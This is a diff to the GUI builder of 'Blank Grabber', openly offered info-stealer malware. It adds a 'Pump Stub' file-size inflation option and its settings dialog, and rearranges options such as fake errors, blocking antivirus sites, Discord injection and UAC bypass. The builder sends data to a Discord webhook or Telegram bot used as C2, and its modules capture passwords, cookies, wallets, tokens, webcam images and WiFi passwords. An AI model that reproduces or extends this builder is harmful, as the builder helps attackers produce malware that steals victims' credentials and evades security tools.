@@ -136,6 +136,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		super().__init__(master, fg_color= "transparent")
 
 		self.fakeErrorData = [False, ("", "", 0)] # (Title, Message, Icon)
+		self.pumpLimit = 0 # Bytes
 
 		self.grid_propagate(False)
 
@@ -145,6 +146,11 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.vmProtectVar = ctk.BooleanVar(self)
 		self.startupVar = ctk.BooleanVar(self)
 		self.meltVar = ctk.BooleanVar(self)
+		self.fakeErrorVar = ctk.BooleanVar(self)
+		self.blockAvSitesVar = ctk.BooleanVar(self)
+		self.discordInjectionVar = ctk.BooleanVar(self)
+		self.uacBypassVar = ctk.BooleanVar(self)
+		self.pumpStubVar = ctk.BooleanVar(self)
 
 		self.captureWebcamVar = ctk.BooleanVar(self)
 		self.capturePasswordsVar = ctk.BooleanVar(self)
@@ -158,10 +164,6 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.captureTelegramVar = ctk.BooleanVar(self)
 		self.captureCommonFilesVar = ctk.BooleanVar(self)
 		self.captureWalletsVar = ctk.BooleanVar(self)
-		self.fakeErrorVar = ctk.BooleanVar(self)
-		self.blockAvSitesVar = ctk.BooleanVar(self)
-		self.discordInjectionVar = ctk.BooleanVar(self)
-		self.uacBypassVar = ctk.BooleanVar(self)
 		
 		self.boundExePath = ""
 		self.iconBytes = ""
@@ -195,6 +197,9 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		self.meltCheckboxControl = ctk.CTkCheckBox(self, text= "Melt Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.meltVar)
 		self.meltCheckboxControl.grid(row= 4, column= 0, sticky= "w", padx= 20)
+
+		self.pumpStubCheckboxControl = ctk.CTkCheckBox(self, text= "Pump Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.pumpStub_Event, variable= self.pumpStubVar)
+		self.pumpStubCheckboxControl.grid(row= 5, column= 0, sticky= "w", padx= 20)
 
 		self.captureWebcamCheckboxControl = ctk.CTkCheckBox(self, text= "Webcam", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureWebcamVar)
 		self.captureWebcamCheckboxControl.grid(row= 1, column= 1, sticky= "w", padx= 20)
@@ -266,7 +271,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		DISCORD = "C2: Discord"
 		TELEGRAM = "C2: Telegram"
 
-		checkBoxes = (
+		discordOnlyCheckBoxes = (
 			(self.pingMeCheckboxControl, self.pingMeVar),
 			(self.discordInjectionCheckboxControl, self.discordInjectionVar)
 		)
@@ -277,7 +282,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			self.C2EntryControl.configure(placeholder_text= "Enter Telegram Endpoint: [Telegram Bot Token]$[Telegram Chat ID]")
 			self.testC2ButtonControl.configure(text= "Test Endpoint")
 
-			for control, var in checkBoxes:
+			for control, var in discordOnlyCheckBoxes:
 				control.configure(state= "disabled")
 				var.set(False)
 
@@ -287,7 +292,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			self.C2EntryControl.configure(placeholder_text= "Enter Discord Webhook URL")
 			self.testC2ButtonControl.configure(text= "Test Webhook")
 
-			for control, _ in checkBoxes:
+			for control, _ in discordOnlyCheckBoxes:
 				control.configure(state= "normal")
 
 		self.C2ModeButtonControl.configure(text= buttonText)
@@ -338,11 +343,12 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		EXEMODE = "Output: EXE File"
 		PYMODE = "Output:   PY File"
 
-		checkBoxControls = (
+		exeOnlyChecboxControls = (
 			(self.captureWebcamCheckboxControl, self.captureWebcamVar),
 			(self.fakeErrorCheckboxControl, self.fakeErrorVar),
 			(self.startupCheckboxControl, self.startupVar),
 			(self.uacBypassCheckboxControl, self.uacBypassVar),
+			(self.pumpStubCheckboxControl, self.pumpStubVar),
 			(self.bindExeButtonControl, None),
 			(self.selectIconButtonControl, None),
 		)
@@ -351,7 +357,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			self.OutputAsExe = False
 			buttonText = PYMODE
 
-			for control, var in checkBoxControls:
+			for control, var in exeOnlyChecboxControls:
 				control.configure(state= "disabled")
 				if var:
 					var.set(False)
@@ -367,7 +373,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			self.OutputAsExe = True
 			buttonText = EXEMODE
 
-			for control, _ in checkBoxControls:
+			for control, _ in exeOnlyChecboxControls:
 				control.configure(state= "normal")
 
 		self.buildModeButtonControl.configure(text= buttonText)
@@ -440,7 +446,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			messagebox.showwarning("Warning", "Unable to connect to the internet!")
 			return
 		
-		if not (self.captureWebcamVar.get() or self.capturePasswordsVar.get() or self.captureCookiesVar.get() or self.captureHistoryVar.get() or self.captureDiscordTokensVar.get() or self.captureGamesVar.get() or self.captureWalletsVar.get() or self.captureWifiPasswordsVar.get() or self.captureSystemInfoVar.get() or self.captureScreenshotVar.get() or self.captureTelegramVar.get() or self.captureCommonFilesVar):
+		if not any([self.captureWebcamVar.get(), self.capturePasswordsVar.get(), self.captureCookiesVar.get(), self.captureHistoryVar.get(), self.captureDiscordTokensVar.get(), self.captureGamesVar.get(), self.captureWalletsVar.get(), self.captureWifiPasswordsVar.get(), self.captureSystemInfoVar.get(), self.captureScreenshotVar.get(), self.captureTelegramVar.get(), self.captureCommonFilesVar.get()]):
 			messagebox.showwarning("Warning", "You must select at least one of the stealer modules!")
 			return
 		
@@ -454,7 +460,8 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 				"uacBypass" : self.uacBypassVar.get(),
 				"archivePassword" : Utility.Password,
 				"consoleMode" : self.ConsoleMode,
-				"debug" : self.ConsoleMode == 2
+				"debug" : self.ConsoleMode == 2,
+				"pumpedStubSize" : self.pumpLimit,
     		},
     
     		"modules" : {
@@ -608,16 +615,76 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			fakeErrorBuilder = FakeErrorBuilder(self)
 			self.wait_window(fakeErrorBuilder)
 			self.fakeErrorVar.set(self.fakeErrorData[0])
+	
+	def pumpStub_Event(self) -> None:
+		if not self.pumpStubVar.get():
+			self.pumpLimit = 0
+		else:
+			pumperSettings = PumperSettings(self)
+			self.wait_window(pumperSettings)
+			self.pumpStubVar.set(pumperSettings.limit > 0)
+			self.pumpLimit = pumperSettings.limit * 1024 * 1024 # Convert to bytes
+
+class PumperSettings(ctk.CTkToplevel):
+
+	def __init__(self, master) -> None:
+		super().__init__(master)
+		self.title("Blank Grabber [File Pumper]")
+		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
+		self.grab_set()
+		self.geometry("500x200")
+		self.resizable(False, False)
 		
+		self.limit = 0
+		self.limitVar = ctk.StringVar(self, value= str(self.limit))
+		self.font = ctk.CTkFont(size= 18)
+
+		self.rowconfigure(0, weight= 1)
+		self.rowconfigure(1, weight= 1)
+		self.rowconfigure(2, weight= 1)
+
+		self.columnconfigure(0, weight= 1)
+		self.columnconfigure(1, weight= 1)
+		self.columnconfigure(2, weight= 1)
+
+		noteLabel = ctk.CTkLabel(self, text= "Please specify the pumped output file size (in MB).\n Note: If the size of the stub is already greater than the\n provided size, nothing happens.", font= self.font)
+		noteLabel.grid(row= 0, column= 0, columnspan= 3, padx= 10)
+
+		limitEntry = ctk.CTkEntry(self, text_color= "white", textvariable= self.limitVar, font= self.font)
+		limitEntry.grid(row= 1, column= 1, padx= 10, pady= 10)
+		limitEntry.bind("<KeyRelease>", self.on_limit_change)
+
+		self.okButton = ctk.CTkButton(self, text= "OK", font= self.font, fg_color= "green", hover_color= "light green", text_color_disabled= "white", command= self.ok_Event)
+		self.okButton.grid(row= 2, column= 1, padx= 10, pady= 10)
+
+	def ok_Event(self) -> None:
+		if self.limitVar.get().isdigit():
+			self.limit = int(self.limitVar.get())
+			self.destroy()
+		else:
+			messagebox.showerror("Error", "The size should be a positive number!")
+	
+	def on_limit_change(self, _):
+		limitBoxText = self.limitVar.get()
+		if limitBoxText.isdigit():
+			self.okButton.configure(state= "normal")
+			self.okButton.configure(fg_color= "green")
+		else:
+			self.okButton.configure(state= "disabled")
+			self.okButton.configure(fg_color= "red")
 	
 class FakeErrorBuilder(ctk.CTkToplevel):
 
 	def __init__(self, master) -> None:
 		super().__init__(master)
+		self.title("Blank Grabber [Fake Error Builder]")
+		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
 		self.grab_set()
 		self.geometry("833x563")
+		self.resizable(True, False)
 
 		self.master = master
+		self.font = ctk.CTkFont(size= 20)
 
 		self.rowconfigure(0, weight= 1)
 		self.rowconfigure(1, weight= 1)
@@ -633,28 +700,28 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 
 		self.iconVar = ctk.IntVar(self, value= 0)
 
-		self.titleEntry = ctk.CTkEntry(self, placeholder_text= "Enter title here", height= 35, font= ctk.CTkFont(size= 20))
+		self.titleEntry = ctk.CTkEntry(self, placeholder_text= "Enter title here", height= 35, font= self.font)
 		self.titleEntry.grid(row = 0, column= 1, padx= 20, sticky= "ew", columnspan= 2)
 
-		self.messageEntry = ctk.CTkEntry(self, placeholder_text= "Enter message here", height= 35, font= ctk.CTkFont(size= 20))
+		self.messageEntry = ctk.CTkEntry(self, placeholder_text= "Enter message here", height= 35, font= self.font)
 		self.messageEntry.grid(row = 1, column= 1, padx= 20, sticky= "ew", columnspan= 2)
 
-		self.iconChoiceSt = ctk.CTkRadioButton(self, text= "Stop", value= 0, variable= self.iconVar, font= ctk.CTkFont(size= 20))
+		self.iconChoiceSt = ctk.CTkRadioButton(self, text= "Stop", value= 0, variable= self.iconVar, font= self.font)
 		self.iconChoiceSt.grid(row= 4, column= 1, sticky= "w", padx= 20)
 
-		self.iconChoiceQn = ctk.CTkRadioButton(self, text= "Question", value= 16, variable= self.iconVar, font= ctk.CTkFont(size= 20))
+		self.iconChoiceQn = ctk.CTkRadioButton(self, text= "Question", value= 16, variable= self.iconVar, font= self.font)
 		self.iconChoiceQn.grid(row= 5, column= 1, sticky= "w", padx= 20)
 
-		self.iconChoiceWa = ctk.CTkRadioButton(self, text= "Warning", value= 32, variable= self.iconVar, font= ctk.CTkFont(size= 20))
+		self.iconChoiceWa = ctk.CTkRadioButton(self, text= "Warning", value= 32, variable= self.iconVar, font= self.font)
 		self.iconChoiceWa.grid(row= 6, column= 1, sticky= "w", padx= 20)
 
-		self.iconChoiceIn = ctk.CTkRadioButton(self, text= "Information", value= 48, variable= self.iconVar, font= ctk.CTkFont(size= 20))
+		self.iconChoiceIn = ctk.CTkRadioButton(self, text= "Information", value= 48, variable= self.iconVar, font= self.font)
 		self.iconChoiceIn.grid(row= 7, column= 1, sticky= "w", padx= 20)
 
-		self.testButton = ctk.CTkButton(self, text= "Test", height= 28, font= ctk.CTkFont(size= 20), fg_color= "#393646", hover_color= "#6D5D6E", command= self.testFakeError)
+		self.testButton = ctk.CTkButton(self, text= "Test", height= 28, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= self.testFakeError)
 		self.testButton.grid(row= 4, column= 2, padx= 20)
 
-		self.saveButton = ctk.CTkButton(self, text= "Save", height= 28, font= ctk.CTkFont(size= 20), fg_color= "#393646", hover_color= "#6D5D6E", command= self.saveFakeError)
+		self.saveButton = ctk.CTkButton(self, text= "Save", height= 28, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= self.saveFakeError)
 		self.saveButton.grid(row= 5, column= 2, padx= 20)
 	
 	def testFakeError(self) -> None:
